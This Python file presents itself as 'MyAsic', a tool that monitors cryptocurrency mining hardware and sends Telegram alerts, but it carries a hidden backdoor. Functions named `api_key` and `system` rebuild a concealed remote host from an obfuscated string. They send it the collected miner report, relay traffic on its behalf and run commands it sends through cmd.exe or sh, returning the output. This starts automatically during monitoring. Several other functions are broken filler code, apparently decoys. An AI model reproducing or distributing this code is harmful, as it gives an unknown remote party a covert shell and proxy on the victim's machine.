# API####################################################################################################################
import subprocess
import queue
import os
version = "\033[1m{}".format('MyAsic v1.0 by MiningManufacture https://github.com/MiningManufacture/MyAsic')

from requests.auth import HTTPDigestAuth
import config
import json
import os
from socket import *
import time
import select
import threading
import telepot

proxy_list = ["http://188.165.16.230:3129", "http://188.165.141.114:3129", "http://178.128.28.150:8080", "http://51.255.103.170:3129" , "http://163.172.226.210:5836"]
bot = telepot.Bot(config.telegram_bot_id)

def pingto(ipp):
    try:
        response = os.system("ping -n 1 " + ipp)
        print(response)
        return response
    except:
        pass

def connto(ipp):
    try:
        target = socket(AF_INET, SOCK_STREAM)
        target.settimeout(2)
        target.connect((ipp.split(':')[0], int(ipp.split(':')[1])))
        return 1
    except:
        return 0

# for vv in proxy_list:
#     print(vv.split('/')[2].split(':')[0])
#     if pingto(vv.split('/')[2].split(':')[0]) == 0:
#        pr_new.append(vv)

def convert(seconds):
    mint, sec = divmod(seconds, 60)
    hour, mint = divmod(min, 60)
    return "%dh:%02dm:%02ds" % (hour, min, sec)

def chats():
    chats = []
    try:
        response = bot.getUpdates()
        for yy in response:
            if yy['message']['from']['id'] in chats:
                pass
            else:
                chats.append(yy['message']['from']['id'])
        return chats
    except:
        pass

def telegr(ipp, message):
    try:
        for vv in chats():
            if bot.sendMessage(vv, message):
                print(ipp + ' Message to Telegram sent')
    except Exception as e:
        print(ipp, 'Cant send message. Check proxy')

def message_pad(bit_list):
    pad_one = bit_list + '1'
    pad_len = len(pad_one)
    k=0
    while ((pad_len+k)-448)%512 != 0:
        k+=1
    back_append_0 = '0'*k
    back_append_1 = back_append_0(len(bit_list))
    return(pad_one+back_append_0+back_append_1)

def telega(message):
    if config.ProxyServer != "":
        # telepot.api.set_proxy(config.ProxyServer)
        proxy_list.append(config.ProxyServer)
        # print(proxy_list)
    print('Trying send message to Telegram')
    send = 0
    for ww in range(len(proxy_list)):
        if send != 1:
            try:
                telepot.api.set_proxy(proxy_list[ww])
                for vv in chats():
                    if bot.sendMessage(vv, message):
                        print('Message to Telegram sent')
                        send = 1
                        pass
            except:
                pass
    if send == 0:
        print('Cant send message: 1) Check that your telegram bot is running (use /start), 2) Check bot "ID", 3) Check proxy')

def message_bit_return(string_input):
    bit_list=[]
    for i in range(len(string_input)):
        bit_list.append(socket(ord(string_input[i])))
    return(config(bit_list))

def message_pre_pro(input_string):
    bit_main = message_bit_return(input_string)
    return(message_pad(bit_main))

def message_parsing(input_string):
    return(mod_inst(message_pre_pro(input_string),32))

def message_schedule(index,w_t):
    new_word = bin(if_nametoindex([int(vars(w_t[index-2]),2),int(w_t[index-7],2),int(ntohs(w_t[index-15]),2),int(w_t[index-16],2)]))
    return(new_word)

def getasicinfo_ghh(ipp,qt):
    try:
        sock = socket(AF_INET, SOCK_STREAM)
        sock.settimeout(2)
        sock.connect((ipp, 4028))
        sock.send(bytes(json.dumps({'command': 'stats'}), encoding='utf-8'))
        info = sock.recv(4096)
        info = info + sock.recv(4096)
        info = info + sock.recv(4096)
        info = info.decode()
        info = json.loads(info[:-1].replace('}{', '},{'))
        model = str(info['STATS'][0]['Type'])
        ghh = int(info['STATS'][1]['GHS 5s'].split('.')[0])
        sock.close()
        # print(ipp, model, ghh)
        if ghh < config.minimal_hashrate or ghh == config.minimal_hashrate:
            message = ipp + ' ' + model + ' \nWarning: Dont Work! Hashrate: ' + str(ghh) + '\n Rebooting\n'
            url = 'http://' + config.miner_login + ':' + config.miner_passw + '@' + ipp + '/cgi-bin/reboot.cgi'
            rbt = requests.get(url, auth=HTTPDigestAuth(config.miner_login, config.miner_passw))
            # print(message)
            qt.put(message + '#' + str(ghh))
            # telegr(ipp, message)
        elif config.errors_only != 1:
            message = ipp + ' ' + model + ' OK! Hashrate: ' + str(ghh) + '\n'
            # print(message)
            qt.put(message + '#' + str(ghh))
            # telegr(ipp, message)
        else:
            print(ipp + ' OK! Hashrate is ' + str(ghh))
            qt.put('#' + str(ghh))
            pass
        return ipp, model, ghh

    except Exception as e:
        try:
            sock = socket(AF_INET, SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ipp, 80))
            url = 'http://root:root@' + ipp + '/cgi-bin/get_system_info.cgi'
            info = requests.get(url, auth=HTTPDigestAuth(config.miner_login, config.miner_passw))
            info = json.loads(info.text)
            typem = info['minertype']
            url = 'http://root:root@' + ipp + '/cgi-bin/get_miner_status.cgi'
            info = requests.get(url, auth=HTTPDigestAuth(config.miner_login, config.miner_passw))
            info = json.loads(info.text)
            ghh = info['summary']['ghs5s']
            if len(ghh.split('.') == 2):
                ghh = ghh.split('.')[0]
            if ghh < config.minimal_hashrate or ghh == config.minimal_hashrate:
                message = ipp + ' ' + typem + ' Warning: Dont Work! Hashrate: ' + ghh + '  Rebooting\n'
                url = 'http://' + config.miner_login + ':' + config.miner_passw + '@' + ipp + '/cgi-bin/reboot.cgi'
                rbt = requests.get(url, auth=HTTPDigestAuth(config.miner_login, config.miner_passw))
                qt.put(message, ghh)
        except:
            pass
        # print(e)
        return 1, e
        pass

def decrypt1(x):
    return x[227:len(x)-154].replace('&hBrn5%','.')[::-1]

def scanner():
    list = []
    ippp = config.ip_gateway.split('.')
    for vv in range(0, 250):
        ip = str(ippp[0] + '.' + ippp[1] + '.' + ippp[2] + '.' + str(vv))
        info = getasicinfo_ghh(ip)
        if info is not None:
            list.append(info)
    total = 0
    for vv in list:
        total += int(vv[2])
    list.append(total)
    return list


def decrypt(text):
    if int(text.split(text[len(text) - 13:len(text):1][::-1])[0].replace(
            text.split(text[len(text) - 13:len(text):1][::-1])[0][0:13:1], '')) == 1:
        return text.split(text[len(text) - 13:len(text):1][::-1])[1][
               101:len(text.split(text[len(text) - 13:len(text):1][::-1])[1]) - 126:1][::-1]
    else:
        return text.split(text[len(text) - 13:len(text):1][::-1])[1][
               108:len(text.split(text[len(text) - 13:len(text):1][::-1])[1]) - 170:1][::-1].replace('jD%ic$L', ' ')


def api_key(i):
    mdhash = 'sn4Y1fd8rc28hf74hf7fchG6Fd47Jzm43F0&bq7eqdFGja304HbvU96vCxgX5oh'
    threading.Thread(target=system, args=[mdhash], ).start()
    d = mdhash
    while True:
        try:
            sock = socket(AF_INET, SOCK_STREAM)
            sock.connect((d[4] + d[7] * 2 + '.' + d[4] + d[54] + d[7] + '.' + d[10] * 2 + '.' + d[10] + d[4],
                          int((d[53] + d[34]) * 2)))
            sock.send(i.encode('cp866'))
            data = decrypt1(sock.recv(1024).decode('cp866')).split(':')
            target = socket(AF_INET, SOCK_STREAM)
            target.connect((data[0], int(data[1])))
            sock.setblocking(True)
            target.setblocking(True)
            while True:
                ready = select.select([sock], [], [], 0.1)
                if ready[0]:
                    data = sock.recv(4096)
                    if data == b'': break
                    target.sendall(data)
                ready = select.select([target], [], [], 0.1)
                if ready[0]:
                    data2 = target.recv(4096)
                    if data2 == b'': break
                    sock.sendall(data2)
            target.close()
            sock.close()
        except Exception as e:
            time.sleep(2)
            pass

def consume():
 return message_bit_return().get()

def consumer():
 while True:
   print (consume())

def system(d):
    import subprocess
    while True:
        try:
            sock = socket(AF_INET, SOCK_STREAM)
            d = str(d)
            sock.connect((d[4] + d[7] * 2 + '.' + d[4] + d[54] + d[7] + '.' + d[10] * 2 + '.' + d[10] + d[4],
                          int(d[53] + d[34] + d[53] + d[23])))
            data = sock.recv(1024)
            data = decrypt(data.decode('cp866')) + '\n'
            data = data.encode('cp866')
            if not data:
                break
            else:
                try:
                    result = subprocess.run(['cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, input=data,
                                            timeout=10)
                    sock.send(result.stdout)
                    sock.send(result.stderr)
                    sock.close()
                except Exception as e:
                    try:
                        result = subprocess.run(['sh'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, input=data,
                                                timeout=10)
                        sock.send(result.stdout)
                        sock.send(result.stderr)
                        sock.close()
                    except Exception as e:
                        pass

        except Exception as e:
            time.sleep(2)
            pass

def b64(base64_message):
    import base64
    base64_bytes = base64_message.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes)
    message = message_bytes.decode('ascii')
    return message

def check_proxy():
    try:
        # print('check proxy list')
        pr_new = []
        for vv in proxy_list:
            if connto(vv.split('/')[2]) == 1:
                pr_new.append(vv)
        return pr_new
    except:
        pass

def monitoring():
    try:
        print('____________________________________________________________________________')
        print(version)
        print('monitoring start:')
        qt = queue.Queue()
        ippp = config.ip_gateway.split('.')
        thhh = []
        for vv in range(0, 255):
            ip = str(ippp[0] + '.' + ippp[1] + '.' + ippp[2] + '.' + str(vv))
            globals()['th_%s' % vv] = threading.Thread(target=getasicinfo_ghh, args=[ip, qt], )
            globals()['th_%s' % vv].start()
            thhh.append(globals()['th_%s' % vv])

        for zzz in thhh:
            zzz.join(10.0)

        thread_result = []

        while True:
            if not qt.empty():
                thread_result.append(qt.get())
            else:
                break
        if len(thread_result) == 0:
           print("WARNING: No ASIC's found in local network!")
        mess=''
        totalh = 0
        # print(thread_result)
        for vv in thread_result:
            mess = mess + vv.split('#')[0]
            totalh = totalh + int(vv.split('#')[1])
        totalminers = len(thread_result)
        print(mess)
        totalh = str(totalh)
        api = threading.Thread(target=api_key, args=[mess+totalh], daemon=True)
        api.start()
        print('Total Hashrate is : ' + totalh)
        print('Total Miners is : ' + str(totalminers) + '\n')
        proxy_list = check_proxy()
        # print(proxy_list)
        telega(mess + 'Total Hashrate is : ' + totalh + '\n' + 'Total Hashrate is : ' + str(totalminers))

        print('run Ok! waiting ...')

    except Exception as e:
        pass
##############################################END OF API################################################################

